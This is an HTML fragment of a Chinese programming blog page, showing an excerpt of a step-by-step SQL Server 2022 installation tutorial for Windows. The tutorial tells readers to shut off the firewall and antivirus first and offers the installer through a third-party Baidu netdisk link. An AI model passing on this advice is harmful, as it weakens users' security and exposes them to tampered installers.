	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a962ecd08a88d811299a09d91427d54b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e601e024ca79b665d33c3d73bbbff4b/" rel="bookmark">
			SQL Server2022版详细安装教程（Windows）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一，下载SQL Server 1.1、百度网盘下载 链接：https://pan.baidu.com/s/1L01OWy-Uy326rVEJWYhfSQ 提取码：2023 我这里面有2022版本和2019版本，这两个版本安装流程差不多
1.2、官网下载 链接：SQL Server Downloads | Microsoft
2、安装 安装前需要先将防火墙和带杀毒软件的先退出关闭掉（防止安装不成功）
2.1、选择自定义安装 2.2、更改位置进行安装 2.3、等待安装 3、进行安装配置 当安装好后会弹出一个这样的页面
3.1、选择安装点击全新SQL Server独立安装或向现有安装添加功能 3.2、默认选Developer，进行下一步 如果有产品密钥的可以选择产品密码，之后将下面两个都选上就可以了
3.3、选择接受，进行下一步 3.4、全局规则，下一步 3.5、Microsoft更新，直接下一步 3.6、安装规则，下一步
3.6、适用于SQL Server的Azure扩展 3.7、功能选择 选择需要的实例功能，可以根据我的进行选择也可以根据自己相关了解进行选择
3.8、实例配置 直接可以点击下一步就可以了
3.9、服务器配置 3.10、数据库引擎配置 1、选择混合模式，设置密码（密码自己设），之后添加当前用户
【账户是指定的是sa】
3.11、功能配置规则 3.12、安装 4、完成 5、安装SSMS 5.1、安装 5.2、正在安装 5.3、已完成 6、打开SQL Server,进行连接 6.1、打开 6.2、进行链接 6.3、成功 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/495/">«</a>
	<span class="pagination__item pagination__item--current">496/621</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/497/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>